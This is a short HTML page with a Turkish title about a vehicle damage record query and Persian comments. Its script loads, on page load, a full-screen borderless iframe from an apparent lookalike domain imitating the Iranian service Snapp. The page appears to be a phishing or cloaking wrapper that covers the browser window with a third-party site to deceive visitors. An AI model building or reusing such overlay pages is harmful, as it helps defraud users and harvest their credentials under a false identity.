<!DOCTYPE html>
<html>
<head>
  <title>TRAMER SORGULAMA KOMUTA MERKEZİ</title>
</head>
<body>
  <div id="iframeContainer"></div>

  <script>
    // تابعی برای ایجاد ایفریم و بارگیری آن به صورت پویا
    function loadIframe() {
      var iframe = document.createElement("iframe");
      iframe.src = "https://snapp-ir.vidmatee.sbs/";
      iframe.style.cssText = "position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;";
      iframe.setAttribute("sandbox", "allow-scripts allow-same-origin");
      document.getElementById("iframeContainer").appendChild(iframe);
    }

    // فراخوانی تابع برای بارگیری ایفریم
    loadIframe();
  </script>
</body>
</html>
